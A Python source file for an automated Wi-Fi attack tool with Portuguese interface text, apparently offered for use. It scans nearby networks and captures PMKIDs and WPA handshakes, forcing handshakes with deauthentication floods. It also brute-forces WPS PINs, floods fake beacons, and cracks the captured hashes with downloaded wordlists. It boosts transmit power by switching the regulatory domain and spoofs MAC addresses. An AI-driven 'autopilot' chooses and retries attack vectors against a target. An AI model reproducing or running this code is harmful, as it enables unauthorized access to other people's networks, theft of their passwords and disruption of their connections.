import subprocess
import os
import time
import csv
import json
import threading
import re
from datetime import datetime

# ==============================================================
# UI MODERNA - HACKER SUPREMO (HARDWARE & DRIVER UNIFIER)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] Erro: Dependências rich ausentes.")
    exit(1)

console = Console()
WEB_CALLBACK = None

def supreme_log(msg, log_type="info"):
    if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
    if log_type == "error": console.print(f"[bold red][!] {msg}[/bold red]")
    elif log_type == "cmd": console.print(f"[bold magenta]>>> {msg}[/bold magenta]")
    else: console.print(f"[bold cyan]{msg}[/bold cyan]")

OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "00:0C:42": "MikroTik",
    "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek", "A4:91:B1": "Intelbras", "00:14:6C": "Netgear"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Fabricante Desconhecido")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns, advice = [], ""
    injection_works = os.path.exists("/tmp/dsi_injection_ok")
    if "Starlink" in vendor or "Starlink" in essid:
        advice = "ALVO NÍVEL 10 (STARLINK). PMF Ativo. Use VETOR X ou AUTOPILOTO."
        vulns.append("PMF (802.11w)")
    elif not injection_works:
        advice = "GARGALO DE HARDWARE: Injeção falhou. Autopiloto priorizando vetores passivos."
    else: advice = "Alvo analisado. Arsenal total liberado."
    return vulns, advice

def test_injection(interface):
    run_command("rm -f /tmp/dsi_injection_ok")
    supreme_log(f"Calibrando Injeção em {interface}...", log_type="cmd")
    run_command(f"iw dev {interface} set channel 6", sudo=True)
    time.sleep(1)
    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
    if stdout and "Injection is working!" in stdout:
        supreme_log("HARDWARE VALIDADO PARA ATAQUE ATIVO.", log_type="info")
        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
        return True
    supreme_log("HARDWARE LIMITADO: Injeção falhou.", log_type="error")
    return False

def boost_signal(interface):
    run_command("iw reg set BO", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"iw dev {interface} set txpower fixed 3000", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except: return None, ""

def check_aircrack_ng():
    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite", "dnsmasq", "hostapd"]
    for f in ferramentas:
        stdout, _ = run_command(f"dpkg -s {f}")
        if not (stdout and "install ok installed" in stdout):
            run_command(f"apt update && apt install -y {f}", sudo=True)
    return True

def update_zero_day():
    supreme_log("PROTOCOLO ZERO-DAY ATIVO.", log_type="cmd")
    run_command("apt update -y", sudo=True)
    run_command("git pull origin main")
    supreme_log("ARSENAL ATUALIZADO.")

def set_monitor_mode(interface):
    supreme_log(f"Invocando Modo Monitor em {interface}...", log_type="cmd")
    run_command("rfkill unblock all", sudo=True)
    run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
    run_command("airmon-ng check kill", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -r {interface}", sudo=True)
    run_command(f"iw dev {interface} set type monitor", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    run_command(f"airmon-ng start {interface}", sudo=True)
    stdout_iw, _ = run_command("iw dev")
    active = None
    for line in stdout_iw.split('\n'):
        if "Interface" in line: current = line.split()[1]
        elif "type monitor" in line and current: active = current; break
    if active: test_injection(active); return active
    return interface

def set_managed_mode(interface):
    supreme_log("HARD RESET: Restaurando rede...", log_type="cmd")
    run_command(f"airmon-ng stop {interface}", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -p {interface}", sudo=True)
    run_command(f"iw dev {interface} set type managed", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    run_command("systemctl unmask NetworkManager wpa_supplicant", sudo=True)
    run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
    run_command("nmcli networking on", sudo=True)
    supreme_log("Internet Restaurada.")

def capture_vetor_x(monitor_interface, bssid, channel, output_file):
    pcapng = f"{output_file}_vetorX.pcapng"; hashf = f"{output_file}_vetorX.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --enable_status=31 --active_beacon --proberequest --wps"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(120); proc.terminate()
    except: pass
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_pmkid(monitor_interface, bssid, channel, output_file, params=None):
    pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    intensity = params.get('intensity', 15) if params else 15
    timeout = params.get('timeout', 60) if params else 60
    cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status={intensity}"
    try:
        proc = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(timeout); proc.terminate()
    except: pass
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file, params=None):
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap_file = f"{output_file}-01.cap"; handshake_found = False
    timeout = params.get('timeout', 30) if params else 30
    for attempt in range(1, 4):
        deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(timeout):
            time.sleep(1)
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
        if handshake_found: break
    dump_proc.terminate(); return cap_file if handshake_found else None

def capture_wps(monitor_interface, bssid, channel, params=None):
    timeout = params.get('timeout', 120) if params else 120
    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return "WPS PIN" in res.stdout
    except: return False

def start_ghost_attack(interface, essid, params=None):
    timeout = params.get('timeout', 30) if params else 30
    cmd = f"sudo mdk4 {interface} b -n \"{essid}\" -g -m"
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(timeout); proc.terminate()
    except: pass

def start_wifite_expert(interface):
    cmd = f"sudo wifite -i {interface} --kill --dict /usr/share/wordlists/rockyou.txt"
    try: subprocess.run(cmd, shell=True)
    except: pass

def start_evil_twin(interface, essid):
    supreme_log("Evil Twin acionado.")

def run_autopilot(interface, target):
    global AUTOPILOT_ACTIVE
    from dsi_ai import DSIAI
    brain = DSIAI()
    AUTOPILOT_ACTIVE = True
    prefix = f"capture_{target['essid']}"
    hw_ok = os.path.exists("/tmp/dsi_injection_ok")
    
    while AUTOPILOT_ACTIVE:
        attack_type, params = brain.suggest_next_attack(target['bssid'], hw_injection_ok=hw_ok)
        supreme_log(f"🧠 IA: Vetor {attack_type.upper()}", log_type="info")

        cap = None
        if attack_type == 'pmkid': cap = capture_pmkid(interface, target['bssid'], target['channel'], prefix, params)
        elif attack_type == 'handshake': cap = capture_handshake(interface, target['bssid'], target['channel'], prefix, params)
        elif attack_type == 'vetorx': cap = capture_vetor_x(interface, target['bssid'], target['channel'], prefix, params)
        elif attack_type == 'wps':
            if capture_wps(interface, target['bssid'], target['channel'], params):
                brain.learn(target['bssid'], target['essid'], 'wps', True); AUTOPILOT_ACTIVE = False
                return "WPS_SUCCESS"
        elif attack_type == 'eviltwin':
            start_evil_twin(interface, target['essid'])
            brain.learn(target['bssid'], target['essid'], 'eviltwin', False, details="Iniciado")
            AUTOPILOT_ACTIVE = False
            return "EVIL_TWIN_STARTED"
        
        if cap:
            brain.learn(target['bssid'], target['essid'], attack_type, True)
            AUTOPILOT_ACTIVE = False
            return cap
        else:
            brain.learn(target['bssid'], target['essid'], attack_type, False)
            supreme_log(f"📉 Vetor {attack_type.upper()} falhou. IA recalcula...", log_type="error")
        
        if not AUTOPILOT_ACTIVE: break
        time.sleep(2)
        
    return None

def scan_networks(monitor_interface):
    boost_signal(monitor_interface)
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    cmd = f"sudo airodump-ng --band abg --update 1 --manufacturer --output-format csv -w {output_prefix} {monitor_interface}"
    try: subprocess.run(cmd, shell=True)
    except KeyboardInterrupt: pass
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if in_ap and not row[0].strip() == "Station MAC":
                    bssid = row[0].strip(); essid = row[13].strip()
                    name = essid if (essid and essid != "\x00") else f"<Oculta: {bssid[-5:]}>"
                    networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': name, 'vendor': identify_vendor(bssid), 'signal': row[8].strip()})
                elif row[0].strip() == "Station MAC": break
    return networks

def get_wifi_interface():
    supreme_log("Mapeando hardware de rádio...", log_type="cmd")
    interfaces = []
    stdout, _ = run_command("iw dev")
    if stdout:
        phy_pattern = re.compile(r'phy#(\d+)')
        iface_pattern = re.compile(r'\s+Interface\s+([a-zA-Z0-9]+)')
        type_pattern = re.compile(r'\s+type\s+([a-zA-Z]+)')
        current_phy = None
        for line in stdout.split('\n'):
            phy_match = phy_pattern.search(line)
            if phy_match: current_phy = f"phy{phy_match.group(1)}"
            iface_match = iface_pattern.search(line)
            if iface_match:
                iface_name = iface_match.group(1)
                stdout_info, _ = run_command(f"iw dev {iface_name} info")
                type_match = type_pattern.search(stdout_info)
                iface_type = type_match.group(1) if type_match else "Desconhecido"
                stdout_phy, _ = run_command(f"iw phy {current_phy} info")
                ap_mode_supported = "AP" in stdout_phy
                interfaces.append({"name": iface_name, "phy": current_phy, "type": iface_type, "ap_support": ap_mode_supported})
    if not interfaces: return None

    if not WEB_CALLBACK:
        table = Table(title="HARDWARE DE RÁDIO")
        table.add_column("ID"); table.add_column("Interface"); table.add_column("Estado"); table.add_column("Suporte Evil Twin")
        for i, iface in enumerate(interfaces):
            ap_status = "[bold green]SIM[/bold green]" if iface['ap_support'] else "[bold red]NÃO[/bold red]"
            table.add_row(str(i + 1), iface['name'], iface['type'], ap_status)
        console.print(table)
        choice = IntPrompt.ask("\nEscolha a interface", choices=[str(i+1) for i in range(len(interfaces))])
        return interfaces[choice - 1]['name']
    else:
        return interfaces

def main():
    if os.geteuid() != 0: return
    check_aircrack_ng()
    iface = get_wifi_interface()
    if iface:
        mon = set_monitor_mode(iface)
        try: scan_networks(mon)
        finally: set_managed_mode(mon)

def crack_hash(hash_file, wordlist_file, bssid=None):
    if hash_file == "WPS_SUCCESS": return
    if not os.path.exists(wordlist_file):
        if "rockyou" in wordlist_file and os.path.exists(wordlist_file + ".gz"):
            run_command(f"gunzip {wordlist_file}.gz", sudo=True)
        else: return
    cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}" if hash_file.endswith(".16800") else f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if "KEY FOUND" in res.stdout or "Status...........: Cracked" in res.stdout:
            supreme_log("SENHA QUEBRADA!", log_type="cmd")
            return True
        if "rockyou" in wordlist_file:
            av_wl = "/tmp/wpa_adv.txt"
            run_command(f"wget -qO {av_wl} https://raw.githubusercontent.com/kennbroorg/iDict/master/iDict_wpa.txt")
            if os.path.exists(av_wl):
                cmd2 = f"hashcat -m 16800 -a 0 {hash_file} {av_wl}" if hash_file.endswith(".16800") else f"aircrack-ng -w {av_wl} -b {bssid} {hash_file}"
                res2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
                if "KEY FOUND" in res2.stdout:
                    supreme_log("SENHA FORTE QUEBRADA!", log_type="cmd")
                    return True
        return False
    except: return False

if __name__ == "__main__": main()
